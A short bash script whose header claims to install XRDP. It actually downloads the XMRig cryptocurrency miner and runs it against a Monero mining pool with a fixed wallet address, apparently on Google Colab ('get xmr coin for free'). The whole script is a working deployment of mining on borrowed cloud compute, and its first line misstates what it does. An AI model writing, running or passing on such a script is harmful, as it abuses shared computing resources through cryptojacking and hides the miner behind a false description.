#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
tar xvzf xmrig-6.17.0-linux-x64.tar.gz
cd xmrig-6.17.0
./xmrig -o solo-xmr.2miners.com:4444 -u 85cTEcifj6xBW52vPvr3eNYjQiynKhDZmVQDjLcv3XHd6j95uN6j4YnBbdUMHita2fcASGTnoGR3B7pv77zpPoV5SS2Jwdc.RIG_ID
